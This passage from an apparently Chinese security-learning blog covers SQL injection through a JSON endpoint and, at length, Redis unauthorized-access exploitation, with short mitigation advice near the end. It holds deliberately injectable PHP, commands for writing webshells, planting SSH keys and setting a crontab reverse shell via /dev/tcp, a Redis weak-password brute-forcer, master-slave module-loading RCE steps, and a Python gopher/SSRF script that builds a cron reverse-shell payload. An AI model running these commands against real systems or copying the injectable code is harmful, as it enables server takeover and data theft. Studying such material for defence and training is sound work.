class="headerlink" title="13.SQL注入JSON接口与白名单"></a>13.SQL注入JSON接口与白名单</h2><h3 id="一、Json简介"><a href="#一、Json简介" class="headerlink" title="一、Json简介"></a>一、Json简介</h3><p>JSON 是存储和交换文本信息的语法，是轻量级的文本数据交换格式。类似xml，但JSON 比 XML 更小、更快，更易解析。所以现在接口数据传输都采用json方式进行。JSON 文本的 MIME 类型是 “application&#x2F;json”。</p><h4 id="json语法"><a href="#json语法" class="headerlink" title="json语法"></a>json语法</h4><pre class="line-numbers language-none"><code class="language-none">数据在名称&#x2F;值对中数据由逗号分隔大括号保存对象中括号保存数组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="JSON-值"><a href="#JSON-值" class="headerlink" title="JSON 值"></a>JSON 值</h4><p>JSON 值可以是：</p><pre class="line-numbers language-none"><code class="language-none">数字（整数或浮点数）  &#123;&quot;age&quot;:30 &#125;字符串（在双引号中）  &#123;&quot;uname&quot;:&quot;yang&quot;&#125;逻辑值（true 或 false） &#123;&quot;flag&quot;:true &#125;数组（在中括号中）&#123;&quot;sites&quot;:[&#123;&quot;name&quot;:&quot;yang&quot;&#125;,&#123;&quot;name&quot;:&quot;ming&quot;&#125;]&#125;对象（在大括号中）JSON 对象在大括号（&#123;&#125;）中书写：null    &#123; &quot;runoob&quot;:null &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Json-demo"><a href="#Json-demo" class="headerlink" title="Json-demo:"></a>Json-demo:</h4><pre class="line-numbers language-none"><code class="language-none">&#123;  &quot;users&quot;: &#123;    &quot;user&quot;: [      &#123;        &quot;id&quot;: &quot;1&quot;,        &quot;username&quot;: &quot;admin&quot;,        &quot;passwd&quot;: &quot;admin888&quot;      &#125;,      &#123;        &quot;id&quot;: &quot;2&quot;,        &quot;username&quot;: &quot;root&quot;,        &quot;passwd&quot;: &quot;root123&quot;      &#125;,      &#123;        &quot;id&quot;: &quot;3&quot;,        &quot;username&quot;: &quot;system&quot;,        &quot;passwd&quot;: &quot;system456&quot;      &#125;    ]  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二、JSON注入"><a href="#二、JSON注入" class="headerlink" title="二、JSON注入"></a>二、JSON注入</h3><p>和xml注入一样，只是数据表现形式不同而已。</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php  header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);  if(isset($_POST[&#39;json&#39;]))&#123;    $json_str&#x3D;$_POST[&#39;json&#39;];    $json&#x3D;json_decode($json_str);    if(!$json)&#123;      die(&#39;JSON文档格式有误，请检查&#39;);    &#125;    $username&#x3D;$json-&gt;username;    &#x2F;&#x2F;$passwd&#x3D;$json-&gt;passwd;     $mysqli&#x3D;new mysqli();    $mysqli-&gt;connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;);    if($mysqli-&gt;connect_errno)&#123;      die(&#39;数据库连接失败：&#39;.$mysqli-&gt;connect_error);    &#125;    $mysqli-&gt;select_db(&#39;user&#39;);    if($mysqli-&gt;errno)&#123;      dir(&#39;打开数据库失败：&#39;.$mysqli-&gt;error);    &#125;    $mysqli-&gt;set_charset(&#39;utf-8&#39;);    $sql&#x3D;&quot;SELECT username,paawd FROM users WHERE username&#x3D;&#39;&#123;$username&#125;&#39;&quot;;    $result&#x3D;$mysqli-&gt;query($sql);    if(!$result)&#123;      die(&#39;执行SQL语句失败：&#39;.$mysqli-&gt;error);    &#125;else if($result-&gt;num_rows&#x3D;&#x3D;0)&#123;      die(&#39;查询结果为空&#39;);    &#125;else &#123;      $array1&#x3D;$result-&gt;fetch_all(MYSQLI_ASSOC);      echo &quot;用户名：&#123;$array1[0][&#39;username&#39;]&#125;,密码：&#123;$array1[0][&#39;paawd&#39;]&#125;&quot;;    &#125;    $result-&gt;free();    $mysqli-&gt;close();  &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和SQL注入一样，插入注入语句。但要注意一点是对影响json语句的要进行转义，如双引号、花括号等。</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402201334771.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402201354160.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402201408252.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/image-20220402201425887.png"></p><h2 id="14-Redis未授权与权限获取"><a href="#14-Redis未授权与权限获取" class="headerlink" title="14.Redis未授权与权限获取"></a>14.Redis未授权与权限获取</h2><h3 id="一-漏洞简介以及危害"><a href="#一-漏洞简介以及危害" class="headerlink" title="一 漏洞简介以及危害"></a>一 漏洞简介以及危害</h3><h4 id="1-什么是redis未授权访问漏洞"><a href="#1-什么是redis未授权访问漏洞" class="headerlink" title="1.什么是redis未授权访问漏洞"></a><strong>1.什么是redis未授权访问漏洞</strong></h4><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis  服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 &#x2F;root&#x2F;.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>简单说，漏洞的产生条件有以下两点：</p><pre class="line-numbers language-none"><code class="language-none">（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-漏洞危害"><a href="#2-漏洞危害" class="headerlink" title="2.漏洞危害"></a>2.漏洞危害</h4><pre class="line-numbers language-none"><code class="language-none">（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；（3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="3-漏洞影响"><a href="#3-漏洞影响" class="headerlink" title="3.漏洞影响"></a>3.漏洞影响</h4><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180828144710796-14972166.png"></p><p>根据 ZoomEye 的探测，全球无验证可直接利用Redis 分布情况如下：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1.jpg"></p><p>全球无验证可直接利用Redis TOP 10国家与地区：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/2.jpg"></p><h3 id="二-漏洞复现"><a href="#二-漏洞复现" class="headerlink" title="二 漏洞复现"></a>二 漏洞复现</h3><p>下载并安装测试用的Redis，本次采用的是Ubuntu镜像：</p><pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;download.redis.io&#x2F;releases&#x2F;redis-2.8.17.tar.gz(如果下载不下来的话：http:&#x2F;&#x2F;distfiles.macports.org&#x2F;redis&#x2F;）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829135535684-1291475162.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829135548075-49366262.png"></p><pre class="line-numbers language-none"><code class="language-none">解压安装包：tar xzf redis-2.8.17.tar.gz进入redis目录：cd redis-2.8.17安装：make<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829140031532-622380540.png"></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829140211357-1935236264.png"></p><pre class="line-numbers language-none"><code class="language-none">make结束后，进入src目录：cd src，将redis-server和redis-cli拷贝到&#x2F;usr&#x2F;bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829144712793-1804449351.png"></p><pre class="line-numbers language-none"><code class="language-none">返回目录redis-2.8.17，将redis.conf拷贝到&#x2F;etc&#x2F;目录下：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829144957783-1493349378.png"></p><pre class="line-numbers language-none"><code class="language-none">使用&#x2F;etc&#x2F;目录下的reids.conf文件中的配置启动redis服务：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829150759215-364206028.png"></p><p>服务启动成功，我们克隆这台虚拟机</p><p>一台作为攻击机，一台作为靶机</p><p>攻击机IP：192.168.0.105</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829152953967-1919683076.png"></p><p>靶机IP：192.168.0.104</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829153116853-982348081.png"></p><pre class="line-numbers language-none"><code class="language-none">启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了。 比如：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829153756135-561199849.png"></p><h3 id="未授权访问漏洞测试"><a href="#未授权访问漏洞测试" class="headerlink" title="未授权访问漏洞测试"></a>未授权访问漏洞测试</h3><p>使用redis客户端直接无账号成功登录redis：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829154232290-987852098.png"></p><p>从登录的结果可以看出该redis服务对公网开放，且未启用认证。</p><h4 id="0x01-利用redis写webshell"><a href="#0x01-利用redis写webshell" class="headerlink" title="0x01 利用redis写webshell"></a>0x01 利用redis写webshell</h4><pre class="line-numbers language-none"><code class="language-none">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里由于本地搭建，我们已经知道目录，我们把shell写入<code>/home/bmjoker/</code>目录下：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829154920415-7768410.png"></p><p><strong>注：</strong></p><p>第三步写入webshell的时候，可以使用：</p><pre class="line-numbers language-none"><code class="language-none">set x &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>\r\n\r\n代表换行的意思，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p><p>shell写入完成，我们在靶机上来证明：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829155036709-1324637836.png"></p><p>成功写入shell。</p><p>当数据库过大时，redis写shell的小技巧：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php set_time_limit(0);$fp&#x3D;fopen(&#39;bmjoker.php&#39;,&#39;w&#39;);fwrite($fp,&#39;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#39;);exit();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="0x02-利用“公私钥”认证获取root权限"><a href="#0x02-利用“公私钥”认证获取root权限" class="headerlink" title="0x02 利用“公私钥”认证获取root权限"></a>0x02 利用“公私钥”认证获取root权限</h4><p>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。</p><p>靶机中开启redis服务：<code>redis-server /etc/redis.conf</code></p><p>在靶机中执行 <code>mkdir /root/.ssh</code>  命令，创建ssh公钥存放目录（靶机是作为ssh服务器使用的）</p><p>在攻击机中生成ssh公钥和私钥，密码设置为空：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829155921988-1732814764.png"></p><p>进入.ssh目录：cd .ssh&#x2F;，将生成的公钥保存到1.txt：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829160548947-2128769871.png"></p><p>链接靶机上的redis服务，</p><p>将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829161011553-822649757.png"></p><p>远程登录靶机的redis服务：redis-cli -h 192.168.0.104 </p><p>并使用 CONFIG GET dir 命令得到redis备份的路径：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829161153168-376237139.png"></p><p>更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh）：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829162331061-1260329184.png"></p><p>设置上传公钥的备份文件名字为authorized_keys：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829161728063-2047960668.png"></p><p>检查是否更改成功（查看有没有authorized_keys文件），没有问题就保存然后退出，</p><p>至此成功写入ssh公钥到靶机：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829161842166-832702796.png"></p><p>在攻击机上使用ssh免密登录靶机：ssh -i id_rsa <a href="mailto:&#114;&#111;&#111;&#116;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#46;&#x31;&#x30;&#52;">&#114;&#111;&#111;&#116;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x30;&#46;&#x31;&#x30;&#52;</a></p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829162556455-2061016348.png"></p><p>利用私钥成功登录redis服务器！！！</p><h4 id="0x03-利用ceontab反弹sehll"><a href="#0x03-利用ceontab反弹sehll" class="headerlink" title="0x03 利用ceontab反弹sehll"></a>0x03 利用ceontab反弹sehll</h4><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p><p><strong>端口监听:</strong></p><p>在攻击者服务器上监听一个端口（未被占用的任意端口）：</p><pre class="line-numbers language-none"><code class="language-none">nc -lvnp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829163608215-1510741291.png"></p><p><strong>攻击详情：</strong></p><p>连接redis，写入反弹shell</p><pre class="line-numbers language-none"><code class="language-none">redis-cli -h 192.168.0.104set xxx &quot;\n\n*&#x2F;1 * * * * &#x2F;bin&#x2F;bash -i&gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;192.168.0.104&#x2F;4444 0&gt;&amp;1\n\n&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829163924530-654251233.png"></p><pre class="line-numbers language-none"><code class="language-none">config set dir &#x2F;var&#x2F;spool&#x2F;cronconfig set dbfilename rootsave<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20180829164111606-684044630.png"></p><p>过一分钟左右就可以收到shell</p><h3 id="Python脚本自动化测试"><a href="#Python脚本自动化测试" class="headerlink" title="Python脚本自动化测试"></a>Python脚本自动化测试</h3><p>可用来测试是否存在未授权或弱口令的情况：</p><pre class="line-numbers language-none"><code class="language-none">#! &#x2F;usr&#x2F;bin&#x2F;env python# _*_  coding:utf-8 _*_import socketimport sysPASSWORD_DIC&#x3D;[&#39;redis&#39;,&#39;root&#39;,&#39;oracle&#39;,&#39;password&#39;,&#39;p@aaw0rd&#39;,&#39;abc123!&#39;,&#39;123456&#39;,&#39;admin&#39;]def check(ip, port, timeout):    try:        socket.setdefaulttimeout(timeout)        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)        s.connect((ip, int(port)))        s.send(&quot;INFO\r\n&quot;)        result &#x3D; s.recv(1024)        if &quot;redis_version&quot; in result:            return u&quot;未授权访问&quot;        elif &quot;Authentication&quot; in result:            for pass_ in PASSWORD_DIC:                s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)                s.connect((ip, int(port)))                s.send(&quot;AUTH %s\r\n&quot; %(pass_))                result &#x3D; s.recv(1024)                if &#39;+OK&#39; in result:                    return u&quot;存在弱口令，密码：%s&quot; % (pass_)    except Exception, e:        passif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    ip&#x3D;sys.argv[1]    port&#x3D;sys.argv[2]    print check(ip,port, timeout&#x3D;10)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>1、比较安全的办法是采用绑定IP的方式来进行控制。</p><p> 请在redis.conf文件找到如下配置</p><pre class="line-numbers language-none"><code class="language-none">If you want you can bind a single interface, if the bind option is not# specified all the interfaces will listen for incoming connections.## bind 127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>把 #bind  127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问，这种情况下，我们在启动redis服务器的时候不能再用:redis-server，改为:redis-server path&#x2F;redis.conf  即在启动的时候指定需要加载的配置文件,其中path&#x2F;是你上面修改的redis配置文件所在目录，这个方法有一点不太好，我难免有多台机器访问一个redis服务。</p><p>2、设置密码，以提供远程登陆</p><p>打开redis.conf配置文件，找到requirepass，然后修改如下:</p><pre class="line-numbers language-none"><code class="language-none">requirepass yourpasswordyourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。  命令如下:redis-cli -h yourIp -p yourPort&#x2F;&#x2F;启动redis客户端，并连接服务器keys * &#x2F;&#x2F;输出服务器中的所有key报错如下(error) ERR operation not permitted  这时候你可以用授权命令进行授权，就不报错了  命令如下:auth youpassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Redis配置错误导致的代码漏洞溯源"><a href="#Redis配置错误导致的代码漏洞溯源" class="headerlink" title="Redis配置错误导致的代码漏洞溯源"></a>Redis配置错误导致的代码漏洞溯源</h3><p>在刷墨者学院的题时，发现了这个不错的题，通过这个题了解Redis在低权限下的渗透思路：**<br>**</p><p>给出了IP：219.153.49.228  ，同时也给出了俩个端口一个是web也就是http端口 419387，一个是redis数据库端口 48055</p><p>尝试用kali链接redis端口：</p><pre class="line-numbers language-none"><code class="language-none">redis-cli -h 219.153.49.228 -p 48055<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接成功，本想用上文的方法，生成ssh密钥把内容写进redis数据库，然后把redis数据库的目录指定到&#x2F;etc&#x2F;.ssh&#x2F;，这样就可以通过ssh直接连接服务器，但是这里权限不够，不能指定到&#x2F;etc&#x2F;.ssh&#x2F;目录。</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20181123172246778-1998041521.png"></p><p>由于服务器是ubuntu的，apache容器，尝试指定一下默认的路径&#x2F;var&#x2F;www&#x2F;html&#x2F;来写入shell:</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20181123172729865-2027000407.png"></p><p>一波写入shell的操作，然后在web页面尝试访问我们写入shell的joker.php文件：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20181123172912361-631905750.png"></p><p>成功写入，尝试用菜刀链接，获取flag:</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20181123173001594-1100631431.png"></p><p>出现这样的问题还是权限控制的不足</p><p><strong>redis主从复制rce</strong><br>　　Redis是一个使用ANSI  C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>　　在Redis  4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。编写恶意so文件的代码 <a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p><p>　　在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><p>网上收集两个比较方便的getshell python脚本</p><p>1.<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>漏洞利用：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20191009204600409-535665648.png"></p><p>2.<a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><p>漏洞利用：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20191009204627174-873967484.png"></p><p>反弹到其他服务器：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20191009204650932-923209536.png"></p><p><strong>ssrf，redis与gopher</strong></p><p>补充篇只来讨论如果通过ssrf探测到内网某ip开启了6379端口，并存在未授权，如何结合gopher协议来写shell。</p><p>　　gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，gopher是Internet上最主要的信息检索工具，gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p><p>gopher协议格式：</p><pre class="line-numbers language-none"><code class="language-none">URL:gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流gopher的默认端口是70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果发起post请求，回车换行需要使用%0d%0a，如果存在多个参数，参数之间的&amp;也需要进行URL编码。注意%0d%0a是\r\n的URL编码。</p><p>gopher发送请求HTTP GET请求:</p><pre class="line-numbers language-none"><code class="language-none">curl gopher:&#x2F;&#x2F;192.168.194.1:6666&#x2F;_abcd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注意：abcd是要传递的数据，_会被吃掉不会传递过去</p><p>由于gopher协议规则比较复杂，这里借助一个github的工具来生成payload：<a href="https://github.com/firebroo/sec_tools">https://github.com/firebroo/sec_tools</a></p><p>只需要在redis-over-gopher&#x2F;redis.cmd中写入redis执行的命令，比如下面的命令直接在web目录下写shell</p><pre class="line-numbers language-none"><code class="language-none">flushallconfig set dir &#x2F;tmpconfig set dbfilename shell.phpset &#39;webshell&#39; &#39;&lt;?php phpinfo();?&gt;&#39;save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编辑好后运行redis-over-gopher&#x2F;redis-over-gopher.py </p><pre class="line-numbers language-none"><code class="language-none">python redis-over-gopher.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>就可以生成支持gopher协议的payload：</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102184648153-1395513140.png"></p><p>使用curl运行payload</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102184706456-696764708.png"></p><p>进入docker容器，发现shell.php已经成功生成</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102184639299-51740366.png"></p><p>注：需要将内容再进行一次url编码传到web的参数中才会正常运行</p><p>使用ssrf端口探测的时候，不要拘泥于http协议，还可以使用dict协议来进行探测</p><p>利用gopher协议反弹shell</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;*gopher协议反弹shell利用脚本*&#x2F;import urllibprotocol&#x3D;&quot;gopher:&#x2F;&#x2F;&quot;ip&#x3D;&quot;192.168.127.140&quot;port&#x3D;&quot;6379&quot;reverse_ip&#x3D;&quot;192.168.127.131&quot;reverse_port&#x3D;&quot;7777&quot;cron&#x3D;&quot;\n\n\n\n*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;%s 0&gt;&amp;1\n\n\n\n&quot;%(reverse_ip,reverse_port)filename&#x3D;&quot;root&quot;path&#x3D;&quot;&#x2F;var&#x2F;spool&#x2F;cron&quot;passwd&#x3D;&quot;&quot;cmd&#x3D;[&quot;flushall&quot;,   &quot;set 1 &#123;&#125;&quot;.format(cron.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;)),   &quot;config set dir &#123;&#125;&quot;.format(path),   &quot;config set dbfilename &#123;&#125;&quot;.format(filename),   &quot;save&quot;   ]if passwd:  cmd.insert(0,&quot;AUTH &#123;&#125;&quot;.format(passwd))payload&#x3D;protocol+ip+&quot;:&quot;+port+&quot;&#x2F;_&quot;def redis_format(arr):  CRLF&#x3D;&quot;\r\n&quot;  redis_arr &#x3D; arr.split(&quot; &quot;)  cmd&#x3D;&quot;&quot;  cmd+&#x3D;&quot;*&quot;+str(len(redis_arr))  for x in redis_arr:    cmd+&#x3D;CRLF+&quot;$&quot;+str(len((x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)  cmd+&#x3D;CRLF  return cmdif __name__&#x3D;&#x3D;&quot;__main__&quot;:  for x in cmd:    payload +&#x3D; urllib.quote(redis_format(x))  print payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102181438636-1255491191.png"></p><p>redis如果有密码，是弱口令的话，可以通过python脚本爆破，看回显来确定密码是否正确</p><p>如果有口令在最前面，和gopher的格式一样，如下健为AUTH，密码为123456</p><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102181808754-1675763347.png"></p><p>爆破的时候需要在寻常的未授权前加上认证的gopher字段</p><pre class="line-numbers language-none"><code class="language-none">%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123456%0D%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆破成功的化可以直接结合gopher协议对redis进行写shell的操作。</p><p>这里结合上面的redis主从复制的RCE来执行命令，先来构造加载exp.so的payload</p><pre class="line-numbers language-none"><code class="language-none">config set dir &#x2F;tmp&#x2F;config set dbfilename &#x2F;tmp&#x2F;slaveof 192.168.127.140 4444module load &#x2F;tmp&#x2F;exp.sosystem.exec &#39;whoami&#39;quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://r1ch029.oss-cn-qingdao.aliyuncs.com/1344396-20210102182908032-751922075.png"></p><p>这样就可以加载本地的exp.so对redis进行爆破，如果爆破成功就执行whoami命令。</p><p>这里只是一种演示，使用此方法同样可以写shell，写计划任务来获取shell。</p><p><strong>相关文章</strong><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a></p><h2 id="15-如何反查真实ip"><a href="#15-如何反查真实ip" class="headerlink" title="15.如何反查真实ip"></a>15.如何反查真实ip</h2><h4 id="11种绕过CDN查找真是IP方法"><a href="#11种绕过CDN查找真是IP方法" class="headerlink" title="11种绕过CDN查找真是IP方法"></a><strong>11种绕过CDN查找真是IP方法</strong></h4><h3 id="0x01-验证是否存在CDN"><a href="#0x01-验证是否存在CDN" class="headerlink" title="0x01 验证是否存在CDN"></a>0x01 验证是否存在CDN</h3><hr><h4 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h4><p>很简单，使用各种多地 ping 的服务，查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<br> <a 